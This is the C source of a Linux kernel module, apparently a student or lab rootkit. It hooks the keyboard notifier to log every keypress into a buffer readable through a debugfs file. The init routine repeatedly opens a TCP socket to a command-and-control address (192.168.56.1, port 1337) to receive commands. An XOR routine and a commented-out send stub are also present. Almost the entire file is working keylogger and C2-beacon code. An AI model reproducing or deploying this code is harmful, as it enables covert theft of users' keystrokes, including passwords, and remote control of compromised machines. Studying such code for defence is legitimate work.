#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/debugfs.h>

MODULE_LICENSE("GPL");
#define NOTIFY_OK 0x0001 // This tells the kernel that everything is OK.
#define MAX_KEY_LEN 12 // This is the longest key length in key buffer 

static const char *keys[][2] = {{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"_PAUSE_", "_PAUSE_"}};

static int maxBufSize = 1024;
static char keysToWrite[1024] = {0};
static size_t bufSize = 0;
static struct dentry* file; //File to be written to
static struct dentry* subdir; // Directory Created to contain the file

static int C2_PORT = 1337;
static char * C2_IP = "192.168.56.1";
struct socket *sock = NULL;
static int CALLBACK_INTERVAL = 30;
static int MAXIMUM_ATTEMPTS = 5;
static enum data_operation {
  SEND = 1,
  RECV = 2
};

static int keylogFunc(struct notifier_block*, void*);
static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset);

const struct file_operations keyOps = {
  .owner = THIS_MODULE,
  .read = readKeys,
};

/*
* readKeys: This function is the read for the file operations, it will read from the device created and write it to the file presented
* @param struct file* file: The file in user space to be written to
* @param char* buffer: the buffer that will be written to the files
* @param size_t len: length of the buffer
* @param loff_t offset: where to start in the buffer
*/
static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset){
  return simple_read_from_buffer(buffer, len, offset, keysToWrite, bufSize);
}

static struct notifier_block keylogger = {
    .notifier_call = keylogFunc
};

/*
* keycodeToAscii: This will take the given keycode and transform it based off the code and shift 
* @param int shift: if shift is pressed or not
* @param int keycode: the code of the key pressed
* @param char* buffer: the buffer to hold the keys
*/
void keycodeToAscii(int shift, int keycode, char* buf){
    //keep track of the keys to be logged 
    if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
      const char* asciiVal;
      // if the shift is pressed
      if (shift == 1){
        asciiVal = keys[keycode][1];
      } else {
        asciiVal = keys[keycode][0];
      }
      snprintf(buf, MAX_KEY_LEN ,"%s", asciiVal);
    }
}

/*
* keylogFunc: This is the function that will be called when a key press event happens. It will transform
*             key pressed into ASCII 
* @param: struct notifier_blk blk: The struct that holds the keylogging function
* @param: void* _param: the struct that holds the keypress
*/
int keylogFunc(struct notifier_block *blk, void *_param){
    struct keyboard_notifier_param *param = _param;
    char buf[MAX_KEY_LEN] = {0};

    // Only log on the down press of the key
    if(param->down){
      keycodeToAscii(param->shift,param->value, buf);
      if (strlen(buf) < 1){
        // Return out if it is an invalid keycode
        return NOTIFY_OK;
      }

      // Reset buffer position before we go out of bounds
      if ((bufSize + strlen(buf)) >= maxBufSize){
        bufSize = 0;
      }
      strncpy(keysToWrite + bufSize, buf, strlen(buf));
      bufSize += strlen(buf);
    }
    return NOTIFY_OK;
}

static uint8_t* encrypt(const uint8_t* msg, unsigned int msg_len, const uint8_t* key, unsigned int key_len) {
  unsigned int i;
  uint8_t* encrypted = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
  memset(encrypted, 0, msg_len + 1);
  for (i = 0; i < msg_len; i++) {
    encrypted[i] = msg[i] ^ key[i % key_len];
  }

  return encrypted;
}

static int to_bytes(int num, uint8_t *ptr) {
  int i;
  for (i = 0; i < 4; i++) {
    ptr[i] = (num >> (24 - (i * 8))) & 0xFF;
  }
}

static int do_data_transfer(char * buffer, size_t length, int operation) {
  struct msghdr msg;
  struct kvec vec;
  // send code stub
  msg.msg_name = 0;
  msg.msg_namelen = 0;
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_flags = 0;

  vec.iov_len = length;
  vec.iov_base = buffer;

  if (operation == SEND ){
    return kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
  } else if (operation == RECV) {
    return kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
  } else {
    return -1;
  }
}

static int __init rootkit_init(void) {
  int shutdown = 0, retval = -1, attempts = 0; 

  uint8_t cmd = 0;

  struct sockaddr_in addr;

  addr.sin_family = AF_INET; 
  addr.sin_addr.s_addr = in_aton(C2_IP); 
  addr.sin_port = htons(C2_PORT);

  printk(KERN_INFO "Loaded kernel module\n");

  //Create the directory and the file
  subdir = debugfs_create_dir("447", NULL);
  file = debugfs_create_file("kylg", 0400, subdir, NULL, &keyOps);
  register_keyboard_notifier(&keylogger);

  while (!shutdown) {
    printk(KERN_INFO "Creating socket\n");
    if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
      printk(KERN_INFO "Failed to create socket, uninstalling now\n");
      goto uninstall;
    }

    // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
    printk(KERN_INFO "Attempting to connect to C2\n");
    while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
      printk("connection with the server failed with error code %i...\n", retval); 
      ssleep(10);
      attempts++;
      if (attempts == MAXIMUM_ATTEMPTS) {
        goto uninstall;
      }
    }

    attempts = 0;
    printk(KERN_INFO "Connection established!\n");

    //char data[3] = {0x41, 0x42, 0x00};
    //printk("SIZE SENT: %i\n", do_data_transfer(data, 3, SEND));

    printk("SIZE RECV: %i\n", do_data_transfer(&cmd, 1, RECV));
    printk("MSG RECV: %x\n", cmd);

    // cleanup current connection
    printk(KERN_INFO "Destroying socket\n");
    sock_release(sock);
    sock = NULL;

    // sleep until next callback
    ssleep(CALLBACK_INTERVAL);
  }

uninstall:
  return retval;
}

static void __exit rootkit_exit(void) {
  printk(KERN_INFO "Removed kernel module\n");
  debugfs_remove_recursive(subdir);
  unregister_keyboard_notifier(&keylogger);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
